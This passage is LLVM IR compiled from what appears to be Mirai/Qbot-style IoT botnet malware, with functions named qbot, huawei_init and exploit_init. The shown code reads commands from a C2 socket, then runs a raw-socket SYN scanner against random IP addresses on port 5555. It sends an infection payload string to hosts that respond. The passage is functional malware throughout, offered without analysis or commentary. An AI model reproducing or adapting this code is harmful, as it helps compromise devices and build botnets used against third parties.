  %50 = tail call i64 @write(i32 %49, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.71, i64 0, i64 0), i64 6) #8
  br label %51

; <label>:51:                                     ; preds = %.lr.ph, %48
  %52 = tail call i8* @strstr(i8* getelementptr inbounds ([1024 x i8], [1024 x i8]* @buf, i64 0, i64 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.72, i64 0, i64 0)) #13
  %53 = icmp eq i8* %52, null
  br i1 %53, label %54, label %._crit_edge.loopexit

; <label>:54:                                     ; preds = %51
  %55 = load i8*, i8** @trigger, align 8
  %56 = tail call i8* @strstr(i8* getelementptr inbounds ([1024 x i8], [1024 x i8]* @buf, i64 0, i64 0), i8* %55) #13
  %57 = icmp eq i8* %56, null
  br i1 %57, label %.backedge, label %58

; <label>:58:                                     ; preds = %54
  tail call void @parse_buffer(i8* getelementptr inbounds ([1024 x i8], [1024 x i8]* @buf, i64 0, i64 0))
  br label %.backedge

.backedge:                                        ; preds = %58, %54
  %59 = load i32, i32* @C2, align 4
  %60 = tail call i64 @read(i32 %59, i8* getelementptr inbounds ([1024 x i8], [1024 x i8]* @buf, i64 0, i64 0), i64 1024) #8
  %61 = trunc i64 %60 to i32
  store i32 %61, i32* @buffer, align 4
  %62 = icmp eq i32 %61, 0
  br i1 %62, label %._crit_edge.loopexit, label %.lr.ph

._crit_edge.loopexit:                             ; preds = %51, %.backedge
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %38
  %63 = load i32, i32* @C2, align 4
  %64 = tail call i32 @close(i32 %63) #8
  tail call void @exit(i32 0) #14
  unreachable

.loopexit.loopexit:                               ; preds = %30
  br label %.loopexit

.loopexit:                                        ; preds = %.loopexit.loopexit, %26, %0
  ret void
}

declare i32 @fcntl(i32, i32, ...) local_unnamed_addr #7

; Function Attrs: noinline nounwind uwtable
define i32 @main(i32, i8** nocapture readnone) local_unnamed_addr #1 {
  tail call void @qbot()
  tail call void @table_init()
  tail call void @watchdog_maintain()
  %3 = tail call i32 @rand() #8
  tail call void @huawei_init() #8
  ret i32 0
}

; Function Attrs: noinline nounwind uwtable
define void @exploit_init() local_unnamed_addr #1 {
  %1 = alloca i32, align 4
  %2 = alloca %struct.fd_set, align 8
  %3 = alloca %struct.fd_set, align 8
  %4 = alloca %struct.timeval, align 8
  %5 = alloca %struct.sockaddr_in, align 4
  %6 = alloca [1514 x i8], align 16
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  store i32 0, i32* %1, align 4
  %9 = tail call i32 @fork() #8
  store i32 %9, i32* @exploit_scanner_pid, align 4
  %10 = icmp sgt i32 %9, 0
  %11 = icmp eq i32 %9, -1
  %or.cond = or i1 %10, %11
  br i1 %or.cond, label %12, label %13

; <label>:12:                                     ; preds = %0
  ret void

; <label>:13:                                     ; preds = %0
  %14 = tail call i32 @util_local_addr()
  store i32 %14, i32* @LOCAL_ADDR, align 4
  tail call void @rand_init()
  %15 = tail call i64 @time(i64* null) #8
  %16 = trunc i64 %15 to i32
  store i32 %16, i32* @exploit_fake_time, align 4
  %17 = tail call noalias i8* @calloc(i64 128, i64 5416) #8
  store i8* %17, i8** bitcast (%struct.exploit_scanner_connection** @conn_table to i8**), align 8
  store i32 0, i32* %1, align 4
  br label %18

; <label>:18:                                     ; preds = %13, %18
  %storemerge179 = phi i32 [ 0, %13 ], [ %26, %18 ]
  %19 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** @conn_table, align 8
  %20 = sext i32 %storemerge179 to i64
  %21 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %19, i64 %20, i32 2
  store i32 0, i32* %21, align 8
  %22 = load i32, i32* %1, align 4
  %23 = sext i32 %22 to i64
  %24 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %19, i64 %23, i32 0
  store i32 -1, i32* %24, align 8
  %25 = load i32, i32* %1, align 4
  %26 = add nsw i32 %25, 1
  store i32 %26, i32* %1, align 4
  %27 = icmp slt i32 %26, 128
  br i1 %27, label %18, label %28

; <label>:28:                                     ; preds = %18
  %29 = tail call i32 @socket(i32 2, i32 3, i32 6) #8
  store i32 %29, i32* @exploit_rsck, align 4
  %30 = icmp eq i32 %29, -1
  br i1 %30, label %31, label %32

; <label>:31:                                     ; preds = %28
  tail call void @exit(i32 0) #14
  unreachable

; <label>:32:                                     ; preds = %28
  %33 = tail call i32 (i32, i32, ...) @fcntl(i32 %29, i32 3, i32 0) #8
  %34 = or i32 %33, 2048
  %35 = tail call i32 (i32, i32, ...) @fcntl(i32 %29, i32 4, i32 %34) #8
  store i32 1, i32* %1, align 4
  %36 = load i32, i32* @exploit_rsck, align 4
  %37 = bitcast i32* %1 to i8*
  %38 = call i32 @setsockopt(i32 %36, i32 0, i32 3, i8* nonnull %37, i32 4) #8
  %39 = icmp eq i32 %38, 0
  br i1 %39, label %.preheader155.preheader, label %40

.preheader155.preheader:                          ; preds = %32
  br label %.preheader155

; <label>:40:                                     ; preds = %32
  %41 = load i32, i32* @exploit_rsck, align 4
  %42 = call i32 @close(i32 %41) #8
  call void @exit(i32 0) #14
  unreachable

.preheader155:                                    ; preds = %.preheader155.preheader, %.preheader155
  %43 = call i32 @rand_next()
  %44 = trunc i32 %43 to i16
  %45 = call zeroext i16 @ntohs(i16 zeroext %44) #12
  %46 = icmp ult i16 %45, 1024
  br i1 %46, label %.preheader155, label %47

; <label>:47:                                     ; preds = %.preheader155
  store i8 69, i8* getelementptr inbounds ([40 x i8], [40 x i8]* @exploit_scanner_rawpkt, i64 0, i64 0), align 16
  %48 = call zeroext i16 @htons(i16 zeroext 40) #12
  store i16 %48, i16* bitcast (i8* getelementptr inbounds ([40 x i8], [40 x i8]* @exploit_scanner_rawpkt, i64 0, i64 2) to i16*), align 2
  %49 = call i32 @rand_next()
  %50 = trunc i32 %49 to i16
  store i16 %50, i16* bitcast (i8* getelementptr inbounds ([40 x i8], [40 x i8]* @exploit_scanner_rawpkt, i64 0, i64 4) to i16*), align 4
  store i8 64, i8* getelementptr inbounds ([40 x i8], [40 x i8]* @exploit_scanner_rawpkt, i64 0, i64 8), align 8
  store i8 6, i8* getelementptr inbounds ([40 x i8], [40 x i8]* @exploit_scanner_rawpkt, i64 0, i64 9), align 1
  %51 = call zeroext i16 @htons(i16 zeroext 5555) #12
  store i16 %51, i16* bitcast (i8* getelementptr inbounds ([40 x i8], [40 x i8]* @exploit_scanner_rawpkt, i64 0, i64 22) to i16*), align 2
  store i16 %44, i16* bitcast (i8* getelementptr inbounds ([40 x i8], [40 x i8]* @exploit_scanner_rawpkt, i64 0, i64 20) to i16*), align 4
  %52 = load i16, i16* bitcast (i8* getelementptr inbounds ([40 x i8], [40 x i8]* @exploit_scanner_rawpkt, i64 0, i64 32) to i16*), align 16
  %53 = and i16 %52, -241
  %54 = or i16 %53, 80
  store i16 %54, i16* bitcast (i8* getelementptr inbounds ([40 x i8], [40 x i8]* @exploit_scanner_rawpkt, i64 0, i64 32) to i16*), align 16
  %55 = call i32 @rand_next()
  %56 = trunc i32 %55 to i16
  store i16 %56, i16* bitcast (i8* getelementptr inbounds ([40 x i8], [40 x i8]* @exploit_scanner_rawpkt, i64 0, i64 34) to i16*), align 2
  %57 = load i16, i16* bitcast (i8* getelementptr inbounds ([40 x i8], [40 x i8]* @exploit_scanner_rawpkt, i64 0, i64 32) to i16*), align 16
  %58 = or i16 %57, 512
  store i16 %58, i16* bitcast (i8* getelementptr inbounds ([40 x i8], [40 x i8]* @exploit_scanner_rawpkt, i64 0, i64 32) to i16*), align 16
  %59 = getelementptr inbounds [1514 x i8], [1514 x i8]* %6, i64 0, i64 0
  %60 = getelementptr inbounds [1514 x i8], [1514 x i8]* %6, i64 0, i64 20
  %61 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %2, i64 0, i32 0, i64 0
  %62 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %3, i64 0, i32 0, i64 0
  %63 = getelementptr inbounds %struct.timeval, %struct.timeval* %4, i64 0, i32 1
  %64 = getelementptr inbounds %struct.timeval, %struct.timeval* %4, i64 0, i32 0
  %65 = bitcast i32* %7 to i8*
  %66 = getelementptr inbounds [1514 x i8], [1514 x i8]* %6, i64 0, i64 16
  %67 = bitcast i8* %66 to i32*
  %68 = getelementptr inbounds [1514 x i8], [1514 x i8]* %6, i64 0, i64 9
  %69 = bitcast i8* %60 to i16*
  %70 = getelementptr inbounds [1514 x i8], [1514 x i8]* %6, i64 0, i64 22
  %71 = bitcast i8* %70 to i16*
  %72 = getelementptr inbounds [1514 x i8], [1514 x i8]* %6, i64 0, i64 32
  %73 = bitcast i8* %72 to i16*
  %74 = getelementptr inbounds [1514 x i8], [1514 x i8]* %6, i64 0, i64 28
  %75 = bitcast i8* %74 to i32*
  %76 = getelementptr inbounds [1514 x i8], [1514 x i8]* %6, i64 0, i64 12
  %77 = bitcast i8* %76 to i32*
  %78 = bitcast %struct.sockaddr_in* %5 to i8*
  %79 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i64 0, i32 0
  %80 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i64 0, i32 2, i32 0
  %81 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i64 0, i32 1
  %82 = bitcast %struct.sockaddr_in* %5 to %struct.sockaddr*
  br label %.loopexit150

.loopexit150.loopexit:                            ; preds = %.loopexit
  br label %.loopexit150

.loopexit150:                                     ; preds = %.loopexit150.loopexit, %47
  %.0128 = phi i32 [ undef, %47 ], [ %.1129, %.loopexit150.loopexit ]
  %83 = load i32, i32* @exploit_fake_time, align 4
  %84 = icmp eq i32 %83, %.0128
  br i1 %84, label %.loopexit154, label %.preheader153

.preheader153:                                    ; preds = %.loopexit150
  store i32 0, i32* %1, align 4
  br label %85

; <label>:85:                                     ; preds = %.preheader153, %85
  call void @llvm.memset.p0i8.i64(i8* nonnull %78, i8 0, i64 16, i32 4, i1 false)
  %86 = call i32 @rand_next()
  %87 = trunc i32 %86 to i16
  store i16 %87, i16* bitcast (i8* getelementptr inbounds ([40 x i8], [40 x i8]* @exploit_scanner_rawpkt, i64 0, i64 4) to i16*), align 4
  %88 = load i32, i32* @LOCAL_ADDR, align 4
  store i32 %88, i32* bitcast (i8* getelementptr inbounds ([40 x i8], [40 x i8]* @exploit_scanner_rawpkt, i64 0, i64 12) to i32*), align 4
  %89 = call fastcc i32 @get_random_ip()
  store i32 %89, i32* bitcast (i8* getelementptr inbounds ([40 x i8], [40 x i8]* @exploit_scanner_rawpkt, i64 0, i64 16) to i32*), align 16
  store i16 0, i16* bitcast (i8* getelementptr inbounds ([40 x i8], [40 x i8]* @exploit_scanner_rawpkt, i64 0, i64 10) to i16*), align 2
  %90 = call zeroext i16 @checksum_generic(i16* bitcast ([40 x i8]* @exploit_scanner_rawpkt to i16*), i32 20) #8
  store i16 %90, i16* bitcast (i8* getelementptr inbounds ([40 x i8], [40 x i8]* @exploit_scanner_rawpkt, i64 0, i64 10) to i16*), align 2
  store i16 %51, i16* bitcast (i8* getelementptr inbounds ([40 x i8], [40 x i8]* @exploit_scanner_rawpkt, i64 0, i64 22) to i16*), align 2
  %91 = load i32, i32* bitcast (i8* getelementptr inbounds ([40 x i8], [40 x i8]* @exploit_scanner_rawpkt, i64 0, i64 16) to i32*), align 16
  store i32 %91, i32* bitcast (i8* getelementptr inbounds ([40 x i8], [40 x i8]* @exploit_scanner_rawpkt, i64 0, i64 24) to i32*), align 8
  store i16 0, i16* bitcast (i8* getelementptr inbounds ([40 x i8], [40 x i8]* @exploit_scanner_rawpkt, i64 0, i64 36) to i16*), align 4
  %92 = call zeroext i16 @htons(i16 zeroext 20) #12
  %93 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* bitcast ([40 x i8]* @exploit_scanner_rawpkt to %struct.iphdr*), i8* getelementptr inbounds ([40 x i8], [40 x i8]* @exploit_scanner_rawpkt, i64 0, i64 20), i16 zeroext %92, i32 20) #8
  store i16 %93, i16* bitcast (i8* getelementptr inbounds ([40 x i8], [40 x i8]* @exploit_scanner_rawpkt, i64 0, i64 36) to i16*), align 4
  store i16 2, i16* %79, align 4
  %94 = load i32, i32* bitcast (i8* getelementptr inbounds ([40 x i8], [40 x i8]* @exploit_scanner_rawpkt, i64 0, i64 16) to i32*), align 16
  store i32 %94, i32* %80, align 4
  %95 = load i16, i16* bitcast (i8* getelementptr inbounds ([40 x i8], [40 x i8]* @exploit_scanner_rawpkt, i64 0, i64 22) to i16*), align 2
  store i16 %95, i16* %81, align 2
  %96 = load i32, i32* @exploit_rsck, align 4
  %97 = call i64 @sendto(i32 %96, i8* getelementptr inbounds ([40 x i8], [40 x i8]* @exploit_scanner_rawpkt, i64 0, i64 0), i64 40, i32 16384, %struct.sockaddr* nonnull %82, i32 16) #8
  %98 = load i32, i32* %1, align 4
  %99 = add nsw i32 %98, 1
  store i32 %99, i32* %1, align 4
  %100 = icmp slt i32 %99, 160
  br i1 %100, label %85, label %.loopexit154.loopexit

.loopexit154.loopexit:                            ; preds = %85
  br label %.loopexit154

.loopexit154:                                     ; preds = %.loopexit154.loopexit, %.loopexit150
  %.1129 = phi i32 [ %.0128, %.loopexit150 ], [ %83, %.loopexit154.loopexit ]
  %101 = tail call i32* @__errno_location() #12
  store i32 0, i32* %101, align 4
  %102 = load i32, i32* @exploit_rsck, align 4
  %103 = call i64 @recvfrom(i32 %102, i8* nonnull %59, i64 1514, i32 16384, %struct.sockaddr* null, i32* null) #8
  %104 = trunc i64 %103 to i32
  %105 = icmp slt i32 %104, 1
  br i1 %105, label %.thread, label %.lr.ph167.preheader

.lr.ph167.preheader:                              ; preds = %.loopexit154
  br label %.lr.ph167

.lr.ph167:                                        ; preds = %.lr.ph167.preheader, %.backedge152
  %106 = phi i64 [ %152, %.backedge152 ], [ %103, %.lr.ph167.preheader ]
  %.0127166 = phi i32 [ %.0127.be, %.backedge152 ], [ 0, %.lr.ph167.preheader ]
  %107 = load i32, i32* %101, align 4
  %108 = icmp eq i32 %107, 11
  br i1 %108, label %.thread.loopexit194, label %109

; <label>:109:                                    ; preds = %.lr.ph167
  %sext = shl i64 %106, 32
  %110 = ashr exact i64 %sext, 32
  %111 = icmp ult i64 %110, 40
  br i1 %111, label %.backedge152, label %112

; <label>:112:                                    ; preds = %109
  %113 = load i32, i32* %67, align 16
  %114 = load i32, i32* @LOCAL_ADDR, align 4
  %115 = icmp eq i32 %113, %114
  %116 = load i8, i8* %68, align 1
  %117 = icmp eq i8 %116, 6
  %or.cond181 = and i1 %115, %117
  %118 = load i16, i16* %69, align 4
  %119 = icmp eq i16 %118, %51
  %or.cond183 = and i1 %or.cond181, %119
  %120 = load i16, i16* %71, align 2
  %121 = icmp eq i16 %120, %44
  %or.cond185 = and i1 %or.cond183, %121
  br i1 %or.cond185, label %122, label %.backedge152

; <label>:122:                                    ; preds = %112
  %123 = load i16, i16* %73, align 16
  %124 = and i16 %123, 5888
  %125 = icmp eq i16 %124, 4608
  br i1 %125, label %126, label %.backedge152

; <label>:126:                                    ; preds = %122
  %127 = load i32, i32* %75, align 4
  %128 = call i32 @ntohl(i32 %127) #12
  %129 = add i32 %128, -1
  %130 = call i32 @htonl(i32 %129) #12
  %131 = load i32, i32* %77, align 4
  %132 = icmp eq i32 %130, %131
  br i1 %132, label %.preheader149, label %.backedge152

.preheader149:                                    ; preds = %126
  %133 = icmp slt i32 %.0127166, 128
  br i1 %133, label %.lr.ph, label %.thread.loopexit194

.lr.ph:                                           ; preds = %.preheader149
  %134 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** @conn_table, align 8
  %135 = sext i32 %.0127166 to i64
  br label %136

; <label>:136:                                    ; preds = %.lr.ph, %140
  %indvars.iv = phi i64 [ %135, %.lr.ph ], [ %indvars.iv.next, %140 ]
  %137 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %134, i64 %indvars.iv, i32 2
  %138 = load i32, i32* %137, align 8
  %139 = icmp eq i32 %138, 0
  br i1 %139, label %142, label %140

; <label>:140:                                    ; preds = %136
  %indvars.iv.next = add nsw i64 %indvars.iv, 1
  %141 = icmp slt i64 %indvars.iv.next, 128
  br i1 %141, label %136, label %.thread.loopexit

; <label>:142:                                    ; preds = %136
  %143 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %134, i64 %indvars.iv
  %144 = icmp eq %struct.exploit_scanner_connection* %143, null
  br i1 %144, label %.thread.loopexit194, label %145

; <label>:145:                                    ; preds = %142
  %146 = trunc i64 %indvars.iv to i32
  %147 = load i32, i32* %77, align 4
  %148 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %134, i64 %indvars.iv, i32 3
  store i32 %147, i32* %148, align 4
  %149 = load i16, i16* %69, align 4
  %150 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %134, i64 %indvars.iv, i32 4
  store i16 %149, i16* %150, align 8
  call fastcc void @exploit_setup_connection(%struct.exploit_scanner_connection* nonnull %143)
  br label %.backedge152

.backedge152:                                     ; preds = %145, %109, %112, %126, %122
  %.0127.be = phi i32 [ %.0127166, %109 ], [ %.0127166, %112 ], [ %.0127166, %126 ], [ %146, %145 ], [ %.0127166, %122 ]
  store i32 0, i32* %101, align 4
  %151 = load i32, i32* @exploit_rsck, align 4
  %152 = call i64 @recvfrom(i32 %151, i8* nonnull %59, i64 1514, i32 16384, %struct.sockaddr* null, i32* null) #8
  %153 = trunc i64 %152 to i32
  %154 = icmp slt i32 %153, 1
  br i1 %154, label %.thread.loopexit194, label %.lr.ph167

.thread.loopexit:                                 ; preds = %140
  br label %.thread

.thread.loopexit194:                              ; preds = %.preheader149, %.lr.ph167, %.backedge152, %142
  br label %.thread

.thread:                                          ; preds = %.thread.loopexit194, %.thread.loopexit, %.loopexit154
  %155 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* nonnull %61) #8, !srcloc !3
  %156 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* nonnull %62) #8, !srcloc !4
  store i32 0, i32* %1, align 4
  br label %157

; <label>:157:                                    ; preds = %.thread, %.thread145
  %.0130175 = phi i32 [ 0, %.thread ], [ %.1131, %.thread145 ]
  %.0132174 = phi i32 [ 0, %.thread ], [ %.1133, %.thread145 ]
  %storemerge136173 = phi i32 [ 0, %.thread ], [ %203, %.thread145 ]
  %158 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** @conn_table, align 8
  %159 = sext i32 %storemerge136173 to i64
  %160 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %158, i64 %159
  %161 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %158, i64 %159, i32 2
  %162 = load i32, i32* %161, align 8
  %163 = icmp eq i32 %162, 0
  br i1 %163, label %.thread145, label %164

; <label>:164:                                    ; preds = %157
  %165 = load i32, i32* @exploit_fake_time, align 4
  %166 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %158, i64 %159, i32 1
  %167 = load i32, i32* %166, align 4
  %168 = sub i32 %165, %167
  %169 = icmp ugt i32 %168, 5
  br i1 %169, label %170, label %175

; <label>:170:                                    ; preds = %164
  %171 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %160, i64 0, i32 0
  %172 = load i32, i32* %171, align 8
  %173 = call i32 @close(i32 %172) #8
  store i32 -1, i32* %171, align 8
  store i32 0, i32* %161, align 8
  %174 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %158, i64 %159, i32 6, i64 0
  call void @util_zero(i8* %174, i32 256)
  br label %.thread145

; <label>:175:                                    ; preds = %164
  %.pr = load i32, i32* %161, align 8
  switch i32 %.pr, label %189 [
    i32 1, label %176
    i32 3, label %176
    i32 4, label %176
    i32 0, label %.thread145
  ]

; <label>:176:                                    ; preds = %175, %175, %175
  %177 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %160, i64 0, i32 0
  %178 = load i32, i32* %177, align 8
  %179 = srem i32 %178, 64
  %180 = zext i32 %179 to i64
  %181 = shl i64 1, %180
  %182 = sdiv i32 %178, 64
  %183 = sext i32 %182 to i64
  %184 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %3, i64 0, i32 0, i64 %183
  %185 = load i64, i64* %184, align 8
  %186 = or i64 %181, %185
  store i64 %186, i64* %184, align 8
  %187 = load i32, i32* %177, align 8
  %188 = icmp sgt i32 %187, %.0132174
  %..0132 = select i1 %188, i32 %187, i32 %.0132174
  br label %.thread145

; <label>:189:                                    ; preds = %175
  %190 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %160, i64 0, i32 0
  %191 = load i32, i32* %190, align 8
  %192 = srem i32 %191, 64
  %193 = zext i32 %192 to i64
  %194 = shl i64 1, %193
  %195 = sdiv i32 %191, 64
  %196 = sext i32 %195 to i64
  %197 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %2, i64 0, i32 0, i64 %196
  %198 = load i64, i64* %197, align 8
  %199 = or i64 %194, %198
  store i64 %199, i64* %197, align 8
  %200 = load i32, i32* %190, align 8
  %201 = icmp sgt i32 %200, %.0130175
  %..0130 = select i1 %201, i32 %200, i32 %.0130175
  br label %.thread145

.thread145:                                       ; preds = %157, %189, %176, %175, %170
  %.1133 = phi i32 [ %.0132174, %170 ], [ %..0132, %176 ], [ %.0132174, %175 ], [ %.0132174, %189 ], [ %.0132174, %157 ]
  %.1131 = phi i32 [ %.0130175, %170 ], [ %.0130175, %176 ], [ %.0130175, %175 ], [ %..0130, %189 ], [ %.0130175, %157 ]
  %202 = load i32, i32* %1, align 4
  %203 = add nsw i32 %202, 1
  store i32 %203, i32* %1, align 4
  %204 = icmp slt i32 %203, 128
  br i1 %204, label %157, label %205

; <label>:205:                                    ; preds = %.thread145
  store i64 0, i64* %63, align 8
  store i64 1, i64* %64, align 8
  %206 = icmp sgt i32 %.1133, %.1131
  %207 = select i1 %206, i32 %.1133, i32 %.1131
  %208 = add nsw i32 %207, 1
  %209 = call i32 @select(i32 %208, %struct.fd_set* nonnull %2, %struct.fd_set* nonnull %3, %struct.fd_set* null, %struct.timeval* nonnull %4) #8
  %210 = call i64 @time(i64* null) #8
  %211 = trunc i64 %210 to i32
  store i32 %211, i32* @exploit_fake_time, align 4
  store i32 0, i32* %1, align 4
  br label %212

; <label>:212:                                    ; preds = %205, %.loopexit
  %storemerge137178 = phi i32 [ 0, %205 ], [ %305, %.loopexit ]
  %213 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** @conn_table, align 8
  %214 = sext i32 %storemerge137178 to i64
  %215 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %213, i64 %214
  %216 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %215, i64 0, i32 0
  %217 = load i32, i32* %216, align 8
  %218 = icmp eq i32 %217, -1
  br i1 %218, label %.loopexit, label %219

; <label>:219:                                    ; preds = %212
  %220 = sdiv i32 %217, 64
  %221 = sext i32 %220 to i64
  %222 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %3, i64 0, i32 0, i64 %221
  %223 = load i64, i64* %222, align 8
  %224 = srem i32 %217, 64
  %225 = zext i32 %224 to i64
  %226 = shl i64 1, %225
  %227 = and i64 %223, %226
  %228 = icmp eq i64 %227, 0
  br i1 %228, label %254, label %229

; <label>:229:                                    ; preds = %219
  store i32 0, i32* %7, align 4
  store i32 4, i32* %8, align 4
  %230 = load i32, i32* %216, align 8
  %231 = call i32 @getsockopt(i32 %230, i32 1, i32 4, i8* nonnull %65, i32* nonnull %8) #8
  %232 = load i32, i32* %7, align 4
  %233 = or i32 %232, %231
  %234 = icmp eq i32 %233, 0
  br i1 %234, label %235, label %250

; <label>:235:                                    ; preds = %229
  %236 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %213, i64 %214, i32 2
  %237 = load i32, i32* %236, align 8
  switch i32 %237, label %249 [
    i32 3, label %238
    i32 4, label %246
  ]

; <label>:238:                                    ; preds = %235
  %239 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %213, i64 %214, i32 8, i64 0
  %240 = call i32 @util_strcpy(i8* %239, i8* getelementptr inbounds ([920 x i8], [920 x i8]* @.str.73, i64 0, i64 0))
  %241 = load i32, i32* %216, align 8
  %242 = call i32 @util_strlen(i8* %239)
  %243 = sext i32 %242 to i64
  %244 = call i64 @send(i32 %241, i8* %239, i64 %243, i32 16384) #8
  call void @util_zero(i8* %239, i32 2560)
  %245 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %213, i64 %214, i32 6, i64 0
  call void @util_zero(i8* %245, i32 256)
  store i32 4, i32* %236, align 8
  br label %.loopexit

; <label>:246:                                    ; preds = %235
  %247 = load i32, i32* %216, align 8
  %248 = call i32 @close(i32 %247) #8
  store i32 -1, i32* %216, align 8
  store i32 0, i32* %236, align 8
  br label %.loopexit

; <label>:249:                                    ; preds = %235
  store i32 3, i32* %236, align 8
  br label %254

; <label>:250:                                    ; preds = %229
  %251 = load i32, i32* %216, align 8
  %252 = call i32 @close(i32 %251) #8
  store i32 -1, i32* %216, align 8
  %253 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %213, i64 %214, i32 2
  store i32 0, i32* %253, align 8
  br label %.loopexit

; <label>:254:                                    ; preds = %219, %249
  %255 = load i32, i32* %216, align 8
  %256 = sdiv i32 %255, 64
  %257 = sext i32 %256 to i64
  %258 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %2, i64 0, i32 0, i64 %257
  %259 = load i64, i64* %258, align 8
  %260 = srem i32 %255, 64
  %261 = zext i32 %260 to i64
  %262 = shl i64 1, %261
  %263 = and i64 %262, %259
  %264 = icmp eq i64 %263, 0
  br i1 %264, label %.loopexit, label %.preheader

.preheader:                                       ; preds = %254
  %265 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %213, i64 %214, i32 2
  %266 = load i32, i32* %265, align 8
  %267 = icmp eq i32 %266, 0
  br i1 %267, label %.loopexit, label %.lr.ph176

.lr.ph176:                                        ; preds = %.preheader
  %268 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %213, i64 %214, i32 5
  %269 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %213, i64 %214, i32 6, i64 0
  %270 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %213, i64 %214, i32 6, i64 64
  %271 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %213, i64 %214, i32 6, i64 0
  %272 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %213, i64 %214, i32 1
  br label %273

; <label>:273:                                    ; preds = %.lr.ph176, %.backedge
  %274 = load i32, i32* %268, align 4
  %275 = icmp eq i32 %274, 256
  br i1 %275, label %276, label %279

; <label>:276:                                    ; preds = %273
  call void @llvm.memmove.p0i8.p0i8.i64(i8* nonnull %269, i8* nonnull %270, i64 192, i32 1, i1 false)
  %277 = load i32, i32* %268, align 4
  %278 = add nsw i32 %277, -64
  store i32 %278, i32* %268, align 4
  br label %279

; <label>:279:                                    ; preds = %276, %273
  store i32 0, i32* %101, align 4
  %280 = load i32, i32* %216, align 8
  %281 = load i32, i32* %268, align 4
  %282 = sext i32 %281 to i64
  %283 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %213, i64 %214, i32 6, i64 %282
  %284 = sub nsw i32 256, %281
  %285 = call i32 @exploit_recv_strip_null(i32 %280, i8* %283, i32 %284, i32 16384)
  switch i32 %285, label %297 [
    i32 0, label %.thread148
    i32 -1, label %286
  ]

.thread148:                                       ; preds = %279
  store i32 104, i32* %101, align 4
  br label %288

; <label>:286:                                    ; preds = %279
  %.pr147 = load i32, i32* %101, align 4
  %287 = icmp eq i32 %.pr147, 11
  br i1 %287, label %.loopexit.loopexit, label %288

; <label>:288:                                    ; preds = %.thread148, %286
  %289 = load i32, i32* %265, align 8
  %290 = icmp eq i32 %289, 3
  %291 = load i32, i32* %216, align 8
  %292 = call i32 @close(i32 %291) #8
  br i1 %290, label %293, label %296

; <label>:293:                                    ; preds = %288
  call fastcc void @exploit_setup_connection(%struct.exploit_scanner_connection* nonnull %215)
  br label %.backedge

.backedge:                                        ; preds = %293, %297
  %294 = load i32, i32* %265, align 8
  %295 = icmp eq i32 %294, 0
  br i1 %295, label %.loopexit.loopexit, label %273

; <label>:296:                                    ; preds = %288
  store i32 -1, i32* %216, align 8
  store i32 0, i32* %265, align 8
  call void @util_zero(i8* nonnull %271, i32 256)
  br label %.loopexit

; <label>:297:                                    ; preds = %279
  %298 = load i32, i32* %268, align 4
  %299 = add nsw i32 %298, %285
  store i32 %299, i32* %268, align 4
  %300 = load i32, i32* @exploit_fake_time, align 4
  store i32 %300, i32* %272, align 4
  %301 = call i32 @util_strlen(i8* nonnull %271)
  %302 = sext i32 %301 to i64
  %303 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %213, i64 %214, i32 6, i64 %302
  store i8 0, i8* %303, align 1
  br label %.backedge

.loopexit.loopexit:                               ; preds = %286, %.backedge
  br label %.loopexit

